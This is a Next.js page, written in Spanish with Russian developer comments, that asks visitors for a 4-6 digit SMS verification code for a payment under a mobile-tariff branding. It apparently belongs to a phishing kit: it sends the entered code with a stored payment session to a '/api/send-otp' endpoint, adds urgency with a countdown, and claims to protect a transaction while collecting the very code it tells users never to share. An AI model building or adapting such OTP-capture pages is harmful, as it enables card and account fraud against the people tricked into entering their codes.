'use client';

import React, { useState, useEffect } from 'react';

export const dynamic = 'force-dynamic';
import { useRouter, useSearchParams } from 'next/navigation';
import Header from '../tarifas-moviles/components/Header';
import Footer from '../tarifas-moviles/components/Footer';

export default function OTPPage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [timeLeft, setTimeLeft] = useState(300); // 5 минут
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const storedSessionId = typeof window !== 'undefined' ? localStorage.getItem('paymentSession') : null;
    if (!storedSessionId) {
      router.push('/tarifas-moviles');
      return;
    }
    setSessionId(storedSessionId);

    // Проверяем наличие ошибки в URL
    const errorParam = searchParams.get('error');
    if (errorParam === 'invalid') {
      setError('Código incorrecto. Por favor, inténtalo de nuevo.');
    }

    // Таймер обратного отсчета
    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          router.push('/payment?error=timeout');
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [router, searchParams]);

  const formatTime = (seconds: number) => {
    const minutes = Math.floor(seconds / 60);
    const remainingSeconds = seconds % 60;
    return `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;
  };

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
    setOtp(value);
    setError(null); // Очищаем ошибку при изменении
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length < 4 || otp.length > 6) {
      setError('Por favor, introduce el código de 4-6 dígitos');
      return;
    }

    setLoading(true);
    setError(null);

    try {
      const response = await fetch('/api/send-otp', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId: sessionId,
          otp: otp
        }),
      });

      if (response.ok) {
        router.push('/processing');
      } else {
        alert('Error al enviar el código. Inténtalo de nuevo.');
      }
    } catch (error) {
      alert('Error al enviar el código. Inténtalo de nuevo.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Header />
      <main className="bg-gray-50 font-sans min-h-screen wave-bg">
        <div className="container mx-auto px-4 py-6 md:py-8">
          <div className="max-w-md mx-auto">
            <div className="tariff-card p-8 text-center slide-in-up">
              <div className="text-6xl mb-6 text-blue-500">
                <i className="fas fa-shield-alt icon-breathe"></i>
              </div>
              
              <h1 className="text-2xl font-bold mb-4 text-gray-800">
                Verificación de seguridad
              </h1>
              
              <p className="text-gray-600 mb-6">
                Introduce el código de verificación de 4-6 dígitos que has recibido por SMS en tu teléfono móvil.
              </p>

              {error && (
                <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg slide-in-up">
                  <div className="flex items-center justify-center gap-2 text-sm text-red-700">
                    <i className="fas fa-exclamation-triangle icon-bounce"></i>
                    {error}
                  </div>
                </div>
              )}

              <form onSubmit={handleSubmit}>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Código SMS (4-6 dígitos)
                  </label>
                  <input
                    type="text"
                    value={otp}
                    onChange={handleOtpChange}
                    maxLength={6}
                    className={`w-full p-4 text-center text-2xl font-mono border rounded-lg focus:ring-2 focus:ring-[#E52E8A] focus:border-transparent tracking-widest transition-all duration-300 ${
                      error ? 'border-red-300 bg-red-50' : 'border-gray-300 focus:shadow-lg'
                    }`}
                    placeholder="000000"
                    required
                  />
                </div>

                <div className="mb-6 p-4 bg-gradient-to-r from-yellow-50 to-orange-50 rounded-lg pulse">
                  <div className="flex items-center justify-center gap-2 text-sm text-orange-700">
                    <i className="fas fa-clock icon-bounce"></i>
                    Tiempo restante: {formatTime(timeLeft)}
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={loading || otp.length < 4 || otp.length > 6}
                  className={`w-full text-lg py-4 rounded-lg font-bold transition-all duration-300 flex items-center justify-center gap-2 ${
                    loading 
                      ? 'btn-loading text-white cursor-not-allowed' 
                      : 'bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white shadow-lg hover:shadow-xl transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none'
                  }`}
                >
                  {loading ? (
                    <>
                      <div className="spinner mr-2"></div>
                      <span className="loading-dots">Verificando</span>
                    </>
                  ) : (
                    <>
                      <i className="fas fa-check"></i>
                      VERIFICAR CÓDIGO
                    </>
                  )}
                </button>
              </form>

              <div className="mt-6 text-sm text-gray-600">
                <p className="mb-2">¿No has recibido el SMS?</p>
                <p className="text-xs text-gray-500">
                  El código puede tardar hasta 2 minutos en llegar. Verifica tu bandeja de mensajes.
                </p>
              </div>

              {sessionId && (
                <div className="mt-6 text-xs text-gray-400">
                  ID de sesión: {sessionId}
                </div>
              )}
            </div>

            {/* Información de seguridad */}
            <div className="text-center mt-6 text-sm text-gray-600">
              <p className="mb-2">
                <i className="fas fa-shield-alt text-green-600 mr-2"></i>
                Este código garantiza la seguridad de tu transacción
              </p>
              <p>
                <i className="fas fa-lock text-green-600 mr-2"></i>
                Nunca compartas este código con nadie
              </p>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
} 